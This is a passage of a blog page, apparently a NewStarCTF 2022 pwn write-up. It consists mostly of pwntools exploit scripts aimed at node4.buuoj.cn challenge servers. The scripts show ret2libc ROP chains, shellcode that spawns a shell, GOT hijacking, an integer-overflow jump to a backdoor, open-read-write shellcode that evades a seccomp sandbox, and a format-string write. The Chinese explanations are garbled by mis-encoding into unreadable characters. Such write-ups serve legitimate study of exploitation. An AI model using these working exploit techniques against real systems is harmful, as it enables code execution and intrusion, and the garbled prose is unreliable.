class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./cala&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25712</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    ru(<span class="hljs-string">&#x27;What\&#x27;s the answer? &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(r.recvuntil(<span class="hljs-string">&#x27;=&#x27;</span>,drop=<span class="hljs-literal">True</span>).replace(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>))))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2libcï¼š">ret2libcï¼š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29708</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------</span><br>pop_rdi=<span class="hljs-number">0x400753</span><br>ret=<span class="hljs-number">0x40050e</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>sla(<span class="hljs-string">&#x27;Glad to meet you again!What u bring to me this time?\n&#x27;</span>,payload)<br>got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x1b45bd</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>sla(<span class="hljs-string">&#x27;Glad to meet you again!What u bring to me this time?\n&#x27;</span>,payload)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2shellcodeï¼š">ret2shellcodeï¼š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./shell&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25903</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br><span class="hljs-comment">#-----------------------------</span><br>sla(<span class="hljs-string">&#x27;Hello my friend.Any gift for me?\n&#x27;</span>,asm(shellcraft.sh()))<br>sla(<span class="hljs-string">&#x27;Anything else?\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x233000</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="fallw1ndâ€™s-giftï¼š">fallw1ndâ€™s giftï¼š</h3><p>GOT Hijackingï¼Œ</p><p>gdbè°ƒè¯•æ¥ç¡®å®šè¯¥æ€æ ·è¾“å…¥addr</p><p>ç”¨objdump -d -M inte ./fallw1ndâ€™s gift å–æ‰¾putsçš„plt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./fallw1nd_gift&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25419</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------</span><br>ru(<span class="hljs-string">&#x27;gift as reward:\n&#x27;</span>)<br>puts_got=<span class="hljs-built_in">eval</span>(rc(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_got)<br>base=puts_got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>puts_plt=base+libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;now input your addr:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x4033f8</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))<br>se(p64(system))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK2">WEEK2</h2><h3 id="uint32-and-ret">uint32 and ret:</h3><p>å°±æ˜¯ä¸ªè´Ÿæ•°è½¬æ— ç¬¦å·ä¼šå˜ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œå°±èƒ½æº¢å‡ºï¼Œç„¶åå¤ªå¤§ä¹Ÿä¸è¡Œreadä¸äº†ï¼Œæ‰¾ä¸€ä¸‹64ä½æ— ç¬¦å·intæ˜¯å¤šå°‘ï¼Œç„¶åå¯¹åº”å‡æ‰ä¸€ç‚¹ï¼Œç”¨gdbè°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œè¿˜æœ‰å°±æ˜¯ç”¨retè°ƒä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./uint&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25835</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>ret=<span class="hljs-number">0x40101a</span><br>backdoor=<span class="hljs-number">0x4011b6</span><br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">4294967094</span>))<br><span class="hljs-comment">#debug()</span><br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="shellcode-revengeï¼š">shellcode-revengeï¼š</h3><p>æ²™ç›’ç¦ç”¨äº†execve</p><p>ä¿æŠ¤å°±canaryæ²¡å¼€</p><p>æ€è·¯ï¼šå°±æ˜¯ç¬¬ä¸€ä¸ªreadå¾€mmapåœ°å€å†™ ï¼ˆè°ƒç”¨readå¾€mmap+21åœ°å€å†™0x800å­—èŠ‚å‡½æ•°ï¼‰çš„æ±‡ç¼–ï¼ˆæ³¨ï¼š21æ˜¯å› ä¸ºæ±‡ç¼–é•¿åº¦ä¸º21ï¼‰ï¼Œå†™å…¥orwåä¼šç´§æ¥ç€æ‰§è¡Œorwè¯­å¥ï¼Œ<br>æ ˆæº¢å‡ºè·³åˆ°mmap</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25278</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>se(asm(shellcraft.read(<span class="hljs-number">0</span>,mmap+<span class="hljs-number">21</span>,<span class="hljs-number">0x800</span>)))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(asm(shellcraft.read(<span class="hljs-number">0</span>,mmap+<span class="hljs-number">21</span>,<span class="hljs-number">0x800</span>)))<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(orw_payload))<br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(mmap))<br>sl(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ç ä¸€åˆ€ï¼š">ç ä¸€åˆ€ï¼š</h3><p>è¿™é¢˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p>åç§»ä¸º8</p><p>æ‰€ä»¥åªè¦æ”¹diamondä¸º10å³å¯<br>diamond=0x404090<br>æ³¨æ„64ä½p64ï¼ˆdiamondï¼‰è¦æ”¾åœ¨åé¢ï¼Œä¸ç„¶è¦è¢«æˆªæ–­<br>æƒ³äº†å¾ˆä¹…æ€ä¹ˆå»äº¤äº’ï¼Œè¿™ä¸ªè„šæœ¬åªèƒ½è¯´æå°æ¦‚ç‡æˆåŠŸï¼Œå¤šè¯•å‡ æ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28562</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;666&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    sl(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-string">&#x27;10&#x27;</span>+<span class="hljs-string">&#x27;c%10$n&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x404090</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="buffer-fly">buffer-fly:</h3><p>ä¿æŠ¤å°±canaryæ²¡å¼€</p><p><img src="/2022/11/16/newstarctf2022/1.png" alt="1"></p><p>printfé‡åˆ°â€™\x00â€™æˆªæ–­ï¼Œæˆ‘ä»¬å¯ä»¥æ³„éœ²åœ¨ rbp-0x20åˆ°rbpä¹‹é—´çš„åœ°å€</p><p>ç¬¬ä¸€ä¸ªreadæˆ‘ä»¬æ³„éœ²å‡½æ•°çš„åœ°å€ï¼Œå¾—åˆ°gadget <code>pop_rdi</code>ï¼Œ<code>system</code></p><p>ç¬¬äºŒä¸ªreadæ³„éœ²æ ˆçš„åœ°å€ï¼Œå¡«å…¥<code>sh flag\x00</code></p><p>å› ä¸ºç¨‹åºclose(0),close(1)å…³é—­äº†æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡º</p><p>æ‰€ä»¥ç¬¬ä¸‰ä¸ªreadæ ˆæº¢å‡ºshæ‰§è¡Œflagï¼Œå¯¼è‡´æ ‡å‡†é”™è¯¯è¾“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./buffer_fly&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28290</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span 